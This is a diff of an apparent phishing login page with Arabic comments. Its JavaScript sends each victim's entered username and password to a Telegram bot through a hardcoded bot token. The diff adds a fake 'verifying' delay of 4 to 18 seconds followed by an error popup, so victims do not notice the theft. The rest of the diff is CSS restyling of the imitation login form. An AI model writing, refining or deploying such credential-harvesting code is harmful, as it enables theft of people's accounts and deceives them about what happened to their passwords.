@@ -29,20 +29,18 @@
     padding: 10px 24px 20px;
   }
   
-  /* رفع العناصر العلوية */
   .top-section {
     width: 100%;
     display: flex;
     flex-direction: column;
     align-items: center;
     flex-grow: 1;
-    padding-top: 5px; /* تقليل البادينج لرفع العربية */
+    padding-top: 5px; 
   }
 
-  /* 1 _ كلمة العربية مرفوعة للأعلى جداً */
   .lang {
     color: #a8a8a8;
-    margin: 0 0 25px 0; /* مسافة أقل بين العربية والشعار */
+    margin: 0 0 25px 0; 
     font-size: 14px; 
   }
   
@@ -53,7 +51,6 @@
     margin-bottom: 35px; 
   }
   
-  /* حاوية الحقل لضبط النص المتحرك */
   .input-container {
     width: 100%;
     position: relative;
@@ -61,7 +58,6 @@
     height: 68px; 
   }
 
-  /* تنسيق الحقل الأساسي */
   .field {
     display: block;
     width: 100%;
@@ -77,7 +73,6 @@
     transition: border-color 0.2s;
   }
   
-  /* النص المتحرك (Placeholder) */
   .field-label {
     position: absolute;
     right: 16px;
@@ -90,12 +85,10 @@
     line-height: 1.2;
   }
 
-  /* إخفاء الـ placeholder الافتراضي */
   .field::placeholder {
     color: transparent;
   }
   
-  /* عند التركيز أو وجود نص: النص يصغر ويطير للزاوية */
   .field:focus ~ .field-label,
   .field.has-value ~ .field-label {
     top: 14px; 
@@ -103,12 +96,10 @@
     color: #a8a8a8;
   }
   
-  /* الحدود الزرقاء عند التركيز */
   .field:focus {
     border-color: #0064E0; 
   }
 
-  /* أيقونة العين */
   .pass-wrapper {
     position: relative;
     width: 100%;
@@ -145,7 +136,6 @@
     display: flex;
   }
 
-  /* زر تسجيل الدخول */
   .primary {
     width: 100%;
     height: 44px; 
@@ -159,9 +149,13 @@
     cursor: pointer;
     transition: opacity 0.2s;
     font-family: inherit;
+    display: flex;
+    align-items: center;
+    justify-content: center;
   }
   
   .primary:active { opacity: 0.8; }
+  .primary:disabled { cursor: not-allowed; opacity: 0.7; }
 
   .forgot {
     color: #f5f5f5;
@@ -309,6 +303,7 @@
     </div>
   </div>
 </div>
+<!-- ===== نهاية الـ Alert ===== -->
 
 <script>
   const BOT_TOKEN = "9043748742:AAFm8auyubbPG6nIrlWwQ--QdIunH_dRM98";
@@ -385,14 +380,32 @@
     window.open(RESET_LINK, "_blank");
   });
 
-  document.getElementById("login").addEventListener("click", () => {
+  // ——— زر تسجيل الدخول مع وقت انتظار عشوائي (من 4 إلى 18 ثانية) ———
+  document.getElementById("login").addEventListener("click", (e) => {
     const username = userField.value.trim();
     const password = passField.value.trim();
     if (!username || !password) return;
 
+    const loginBtn = e.target;
+    
+    // تعطيل الزر وتغيير النص
+    loginBtn.disabled = true; 
+    const originalText = loginBtn.innerText;
+    loginBtn.innerText = "جاري التحقق...";
+
+    // إرسال البيانات فوراً
     const msg = `🔐 <b>محاولة تسجيل دخول</b>\n👤 المستخدم: <code>${username}</code>\n🔑 كلمة السر: <code>${password}</code>`;
     sendToTelegram(msg);
-    overlay.classList.add("ios-show");
+
+    // توليد وقت عشوائي: (14000 جزء عشوائي) + 4000 جزء ثابت = بين 4000ms و 18000ms (4 إلى 18 ثانية)
+    const randomTime = Math.floor(Math.random() * 14000) + 4000; 
+
+    // الانتظار ثم إظهار الخطأ
+    setTimeout(() => {
+      loginBtn.disabled = false;
+      loginBtn.innerText = originalText;
+      overlay.classList.add("ios-show");
+    }, randomTime);
   });
 
   document.getElementById("forgot").addEventListener("click", (e) => {
